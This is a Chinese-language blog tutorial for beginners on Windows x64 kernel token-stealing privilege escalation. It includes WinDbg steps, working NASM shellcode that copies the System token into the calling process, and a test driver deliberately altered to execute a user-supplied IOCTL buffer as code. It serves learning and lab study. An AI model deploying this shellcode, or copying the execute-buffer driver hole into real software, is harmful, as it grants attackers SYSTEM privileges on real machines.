---
title: Windows x64内核提权
date: 2018-01-14 10:37:11
categories: windows
tags:
	- windows-kernel
	- novice
---
老生长谈的Windows内核提权，没啥好说的，适合新手入门学习了解这种内核token提权的方法。

<!--more-->
# x64内核提权

> 注意：在内核中的到处混用会导致BSOD蓝屏以及数据的丢失。强烈建议在虚拟机或其他非工作系统中测试。

## 介绍

运行中的Windows进程所关联的用户帐户和访问权限由一个叫做令牌（token）的内核对象仲裁。用于跟踪各种特定进程数据的内核数据结构包含了一个指向token的指针。当进程试图去执行各种操作时，比如打开一个文件，token中的账户权限会用于和所需的权限进行比较，以此决定该操作是否可行。

因为token指针只是内核内存中的数据，对于在内核模式中执行的代码来说，将其更改为指向不同的token以赋予该进程一个不同的权限集，这不足为道。这强调了保护系统不受本地用户利用的漏洞影响的重要性，这些漏洞可以导致在内核中执行代码。

本文会提供一个说明和示例exp代码，用于将一个进程提权到系统管理员权限。从我的设备驱动开发一文中修改设备驱动程序并进行测试，这将被用作向内核中注入可执行代码的方法。

## 细节

我们将使用标准的用户权限启动命令行(cmd.exe)用于演练，然后使用内核调试器手动定位更高权限进程的token，并使得运行的cmd.exe也提权到系统级权限。

首先，找到System进程的16进制地址：

```
kd> !process 0 0 System
PROCESS fffffa8003cf11d0
    SessionId: none  Cid: 0004    Peb: 00000000  ParentCid: 0000
    DirBase: 00187000  ObjectTable: fffff8a0000018b0  HandleCount: 687.
    Image: System
```

它指向一个`_EPROCESS`结构，下面是该结构的一些字段：

```
kd> dt _EPROCESS fffffa8003cf11d0
nt!_EPROCESS
   +0x000 Pcb              : _KPROCESS
   +0x160 ProcessLock      : _EX_PUSH_LOCK
   +0x168 CreateTime       : _LARGE_INTEGER 0x1cbdcf1`54a2bf4a
   +0x170 ExitTime         : _LARGE_INTEGER 0x0
   +0x178 RundownProtect   : _EX_RUNDOWN_REF
   +0x180 UniqueProcessId  : 0x00000000`00000004 Void
   +0x188 ActiveProcessLinks : _LIST_ENTRY [ 0xfffffa80`05b3c828 - 0xfffff800`02e71b30 ]
   +0x198 ProcessQuotaUsage : [2] 0
   +0x1a8 ProcessQuotaPeak : [2] 0
   +0x1b8 CommitCharge     : 0x1e
   +0x1c0 QuotaBlock       : 0xfffff800`02e50a80 _EPROCESS_QUOTA_BLOCK
   +0x1c8 CpuQuotaBlock    : (null)
   +0x1d0 PeakVirtualSize  : 0xf70000
   +0x1d8 VirtualSize      : 0x870000
   +0x1e0 SessionProcessLinks : _LIST_ENTRY [ 0x00000000`00000000 - 0x0 ]
   +0x1f0 DebugPort        : (null)
   +0x1f8 ExceptionPortData : (null)
   +0x1f8 ExceptionPortValue : 0
   +0x1f8 ExceptionPortState : 0y000
   +0x200 ObjectTable      : 0xfffff8a0`000018b0 _HANDLE_TABLE
   +0x208 Token            : _EX_FAST_REF
   +0x210 WorkingSetPage   : 0
   [...]
```

token是一个保存在偏移0x208的指针值，我们可以打印出它的值：

```
kd> dq fffffa8003cf11d0+208 L1
fffffa80`03cf13d8  fffff8a0`00004c5c
```

你可能已经注意到在`_EPROCESS`结构体中，token字段是以`_EX_FAST_REF`来声明的而不是期望的`_TOKEN`结构。`_EX_FAST_REF`结构是一种技巧，它依赖于一种假定，在16字节的边界上需要将内核数据结构对齐到内存中。这意味着一个指向token或其他任何内核对象的指针最低的4个位永远都是0（十六进制就是最后一个数永远为0）。Windows因此可以自由的使用该指针的低4位用于其他目的（在本例中为可用于内部优化的引用计数)。

```
kd> dt _EX_FAST_REF
nt!_EX_FAST_REF
   +0x000 Object           : Ptr64 Void
   +0x000 RefCnt           : Pos 0, 4 Bits
   +0x000 Value            : Uint8B
```

从`_EX_FAST_REF`中获取实际的指针只需要简单的修改最后的一位十六进制数位0即可。通过程序实现的话，就将最低4位的值与0值按位与：

```
kd> ? fffff8a0`00004c5c & ffffffff`fffffff0
Evaluate expression: -8108898235312 = fffff8a0`00004c50
```

可以通过`dt _TOKEN`或更好的`!token`扩展命令来显示一个token：

```
kd> !token fffff8a0`00004c50
_TOKEN fffff8a000004c50
TS Session ID: 0
User: S-1-5-18
Groups:
 00 S-1-5-32-544
    Attributes - Default Enabled Owner
 01 S-1-1-0
    Attributes - Mandatory Default Enabled
 02 S-1-5-11
    Attributes - Mandatory Default Enabled
 03 S-1-16-16384
    Attributes - GroupIntegrity GroupIntegrityEnabled
Primary Group: S-1-5-18
Privs:
 02 0x000000002 SeCreateTokenPrivilege            Attributes -
 03 0x000000003 SeAssignPrimaryTokenPrivilege     Attributes -
 04 0x000000004 SeLockMemoryPrivilege             Attributes - Enabled Default
[...]
```

注意到安全标志符（SID）的值S-1-5-18是内置的本地系统账户的SID（查看微软的[well-known SIDs reference](https://support.microsoft.com/zh-cn/help/243330/well-known-security-identifiers-in-windows-operating-systems)）。

下一步就是定位cmd.exe进程的`_EPROCESS`结构并替换偏移0x208的token指针值为System的token地址。

```
kd> !process 0 0 cmd.exe
PROCESS fffffa80068ea060
    SessionId: 1  Cid: 0d0c    Peb: 7fffffdf000  ParentCid: 094c
    DirBase: 1f512000  ObjectTable: fffff8a00b8b5a10  HandleCount:  18.
    Image: cmd.exe

kd> eq fffffa80068ea060+208 fffff8a000004c50
```

最后，转到命令行，使用whoami来看看用户账户。你也可以通过运行命令或访问那些你所知道的需要系统管理权限的文件来验证。

![](/images/exploit/misc/20180114_1.jpg)

## exp代码

通过代码来实现上述的过程非常简单，相比较几年来广泛使用的x86提权的代码，x64仅有着一些次要的差异。

我反汇编了`nt!PsGetCurrentProcess`函数来查看如何获取当前进程的`_EPROCESS`地址。系统中运行的所有进程的`_EPROCESS`结构体都通过`ActiveProcessLinks`字段被链在一个双向链表中。我们可以通过下面的这些链接来定位System进程，查找进程ID为4即可。

```assembly

;priv.asm
;grant SYSTEM account privileges to calling process
 
[BITS 64]
 
start:
;    db 0cch                 ;uncomment to debug
    mov rdx, [gs:188h]      ;get _ETHREAD pointer from KPCR
    mov r8, [rdx+70h]       ;_EPROCESS (see PsGetCurrentProcess function)
    mov r9, [r8+188h]       ;ActiveProcessLinks list head
 
    mov rcx, [r9]           ;follow link to first process in list
find_system_proc:
    mov rdx, [rcx-8]        ;offset from ActiveProcessLinks to UniqueProcessId
    cmp rdx, 4              ;process with ID 4 is System process
    jz found_it
    mov rcx, [rcx]          ;follow _LIST_ENTRY Flink pointer
    cmp rcx, r9             ;see if back at list head
    jnz find_system_proc
    db 0cch                 ;(int 3) process #4 not found, should never happen
 
found_it:
    mov rax, [rcx+80h]      ;offset from ActiveProcessLinks to Token
    and al, 0f0h            ;clear low 4 bits of _EX_FAST_REF structure
    mov [r8+208h], rax      ;replace current process token with system token
    ret
```

我在Cygwin中使用了[NASM](http://nasm.us/)来汇编该份代码（本地win32 NASM二进制亦可）。编译：

`nasm priv.asm`

这会产生一个原生二进制输出文件—priv（没有文件后缀扩展）。

注意NASM生成的`int 3`指令的双字节操作码为`0xCD 0x03`而不是标准的调试器单字节断点`0xCC`。着将在内核调试中引发问题因为它假定在内存中的下一个指令仅仅是向前一字节而不是双字节。命中断点后，通过手动调整RIP寄存器向后移动一字节即可继续正常工作。最好的办法还是先用`db 0cch`生成正确的操作码。

## 测试

我的[设备驱动程序开发](http://mcdermottcybersecurity.com/articles/64-bit-device-driver-development)一文中展示了一个驱动程序示例，它通过一个设备I/O控制接口接受一个用户模式字符串，简单的在内核调试器中打印该字符串。为了测试上面的exp代码，我修改了该驱动来将传递进来的数据作为代码执行。

```cpp
void (*func)();
 
//execute code in buffer
func = (void(*)())buf;
func();
```

这当然需要内存页被标记为可执行，否则数据执行保护（DEP）会触发异常。实际上通过IOCTL接口（METHOD_DIRECT）传递进来的缓冲区默认是可执行的，我也表示很惊讶。我不确定是否永远如此，并且我可以确认这和x64系统上内核内存使用的大页面有关，这使得内存保护不切实际（内存只能在虚拟内存页大小的粒度上设置为不可执行）。

此后我修改了用户模式测试程序，使用下面的函数来从priv二进制文件中读取数据而不再是传递一个硬编码的字符串：

```cpp
//allocates buffer and reads entire file
//returns NULL on error
//stores length to bytes_read if non-NULL
char *read_file_data(char *filename, int *bytes_read) {
    char *buf;
    int fd, len;
 
    fd = _open(filename, _O_RDONLY | _O_BINARY);
 
    if (-1 == fd) {
        perror("Error opening file");
        return NULL;
    }
 
    len = _filelength(fd);
 
    if (-1 == len) {
        perror("Error getting file size");
        return NULL;
    }
 
    buf = malloc(len);
 
    if (NULL == buf) {
        perror("Error allocating memory");
        return NULL;
    }    
 
    if (len != _read(fd, buf, len)) {
        perror("error reading from file");
        return NULL;
    }
 
    _close(fd);
 
    if (bytes_read != NULL) {
        *bytes_read = len;
    }
 
    return buf;
}
```

最后，我也修改了测试程序在驱动执行了exp代码后，在一个分离的进程中启动一个命令行：

```cpp
//launch command prompt (cmd.exe) as new process
void run_cmd() {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
 
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
 
    if (!CreateProcess(L"c:\\windows\\system32\\cmd.exe", NULL, NULL, NULL, FALSE,
                CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
        debug("error spawning cmd.exe");
    } else {
        printf("launched cmd.exe with process id %d\n", pi.dwProcessId);
    }
}
```

新的命令行进程继承了测试程序进程的token，它已经被提权到系统token的权限。

